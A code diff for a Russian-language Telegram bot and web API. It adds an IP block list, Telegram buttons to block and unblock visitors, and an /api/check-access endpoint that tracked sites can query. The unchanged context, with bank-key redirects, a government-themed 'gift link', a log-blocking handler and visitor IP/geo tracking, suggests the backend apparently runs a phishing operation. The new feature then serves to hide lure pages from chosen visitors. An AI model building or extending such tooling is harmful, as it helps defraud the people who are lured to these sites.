@@ -302,6 +302,40 @@ def reset_site_stats(site_id: str):
     data[site_id] = {"date": "", "today": [], "total": []}
     save_unique_ips(data)
 
+# --- Блокировка IP ---
+BLOCKED_IPS_FILE = os.path.join(os.path.dirname(__file__), "data", "blocked_ips.json")
+
+def load_blocked_ips() -> dict:
+    if os.path.exists(BLOCKED_IPS_FILE):
+        try:
+            with open(BLOCKED_IPS_FILE, "r") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {}
+
+def save_blocked_ips(data: dict):
+    os.makedirs(os.path.dirname(BLOCKED_IPS_FILE), exist_ok=True)
+    with open(BLOCKED_IPS_FILE, "w") as f:
+        json.dump(data, f, indent=2)
+
+def block_ip(ip: str, site_id: str = "all"):
+    """Block an IP for a site (or all sites)."""
+    data = load_blocked_ips()
+    data[ip] = {"site": site_id, "time": datetime.datetime.now().isoformat()}
+    save_blocked_ips(data)
+
+def unblock_ip(ip: str):
+    """Unblock an IP."""
+    data = load_blocked_ips()
+    data.pop(ip, None)
+    save_blocked_ips(data)
+
+def is_ip_blocked(ip: str) -> bool:
+    """Check if IP is blocked."""
+    data = load_blocked_ips()
+    return ip in data
+
 # --- GEO и Реферер ---
 
 async def get_geo(ip: str) -> str:
@@ -1375,6 +1409,53 @@ async def security_key(callback: types.CallbackQuery):
     
     await callback.answer(f"✅ Редирект на ключ {bank_name}")
 
+# --- ЗАБЛОКИРОВАТЬ IP ---
+@router.callback_query(F.data.startswith("block_ip:"))
+async def block_ip_handler(callback: types.CallbackQuery):
+    ip = callback.data.split(":", 1)[1]
+    block_ip(ip)
+
+    # Обновляем кнопку на "Разблокировать"
+    new_text = callback.message.text or callback.message.html_text or ""
+    if "🚫 ЗАБЛОКИРОВАН" not in (callback.message.text or ""):
+        # Добавляем метку в текст
+        new_text = (callback.message.html_text or "") + "\n\n🚫 <b>IP ЗАБЛОКИРОВАН</b>"
+    
+    try:
+        await callback.message.edit_text(
+            new_text,
+            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+                [types.InlineKeyboardButton(text="✅ Разблокировать", callback_data=f"unblock_ip:{ip}")]
+            ])
+        )
+    except Exception:
+        pass
+    await callback.answer(f"🚫 IP {ip} заблокирован!", show_alert=True)
+    logger.info(f"IP заблокирован: {ip}")
+
+# --- РАЗБЛОКИРОВАТЬ IP ---
+@router.callback_query(F.data.startswith("unblock_ip:"))
+async def unblock_ip_handler(callback: types.CallbackQuery):
+    ip = callback.data.split(":", 1)[1]
+    unblock_ip(ip)
+
+    # Убираем метку блокировки из текста
+    text = callback.message.html_text or ""
+    text = text.replace("\n\n🚫 <b>IP ЗАБЛОКИРОВАН</b>", "")
+    text = text.replace(" 🚫 ЗАБЛОКИРОВАН", "")
+
+    try:
+        await callback.message.edit_text(
+            text,
+            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+                [types.InlineKeyboardButton(text="🚫 Заблокировать", callback_data=f"block_ip:{ip}")]
+            ])
+        )
+    except Exception:
+        pass
+    await callback.answer(f"✅ IP {ip} разблокирован!", show_alert=True)
+    logger.info(f"IP разблокирован: {ip}")
+
 # --- ЗАБЛОКИРОВАТЬ ЛОГ ---
 @router.callback_query(F.data.startswith("block_log:"))
 async def block_log(callback: types.CallbackQuery):
@@ -1492,6 +1573,13 @@ async def api_claim_link():
     link = get_gift_link("gos")
     return {"link": link}
 
+@app.get("/api/check-access")
+async def api_check_access(request: Request):
+    """Проверка: не заблокирован ли IP посетителя"""
+    ip = request.headers.get("X-Real-IP", request.client.host if request.client else "unknown")
+    blocked = is_ip_blocked(ip)
+    return {"blocked": blocked}
+
 @app.post("/api/track/visit")
 async def api_track_visit(request: Request):
     """Трекинг визита на сайт"""
@@ -1524,16 +1612,24 @@ async def api_track_visit(request: Request):
     new_badge = " 🆕" if is_new else ""
 
     if is_notifications_enabled(site_id):
+        blocked = is_ip_blocked(ip)
+        block_badge = " 🚫 ЗАБЛОКИРОВАН" if blocked else ""
+        block_btn_text = "✅ Разблокировать" if blocked else "🚫 Заблокировать"
+        block_btn_data = f"unblock_ip:{ip}" if blocked else f"block_ip:{ip}"
+
         try:
             await bot.send_message(
                 TRACK_CHANNEL,
-                f"👁 <b>Визит</b> — {site['emoji']} {site['name']}{new_badge}\n\n"
+                f"👁 <b>Визит</b> — {site['emoji']} {site['name']}{new_badge}{block_badge}\n\n"
                 f"🌐 IP: <code>{ip}</code>\n"
                 f"{geo_line}"
                 f"{device} | {browser}\n"
                 f"{source}\n"
                 f"🔍 <code>{user_agent[:200]}</code>\n"
                 f"📊 Сегодня: {st.get('visit_daily', 0)} визитов (👥 {uniq_today} уник.)",
+                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+                    [types.InlineKeyboardButton(text=block_btn_text, callback_data=block_btn_data)]
+                ])
             )
         except Exception as e:
             logger.error(f"Track visit send error: {e}")
@@ -1570,10 +1666,15 @@ async def api_track_click(request: Request):
     source = parse_source(utm_source, referer)
 
     if is_notifications_enabled(site_id):
+        blocked = is_ip_blocked(ip)
+        block_badge = " 🚫 ЗАБЛОКИРОВАН" if blocked else ""
+        block_btn_text = "✅ Разблокировать" if blocked else "🚫 Заблокировать"
+        block_btn_data = f"unblock_ip:{ip}" if blocked else f"block_ip:{ip}"
+
         try:
             await bot.send_message(
                 TRACK_CHANNEL,
-                f"🎯 <b>Клик</b> — {site['emoji']} {site['name']}\n\n"
+                f"🎯 <b>Клик</b> — {site['emoji']} {site['name']}{block_badge}\n\n"
                 f"🔘 {btn_label}\n"
                 f"🌐 IP: <code>{ip}</code>\n"
                 f"{geo_line}"
@@ -1581,6 +1682,9 @@ async def api_track_click(request: Request):
                 f"{source}\n"
                 f"🔍 <code>{user_agent[:200]}</code>\n"
                 f"📊 Сегодня: {st.get('click_daily', 0)} кликов | {st.get('visit_daily', 0)} визитов",
+                reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
+                    [types.InlineKeyboardButton(text=block_btn_text, callback_data=block_btn_data)]
+                ])
             )
         except Exception as e:
             logger.error(f"Track click send error: {e}")
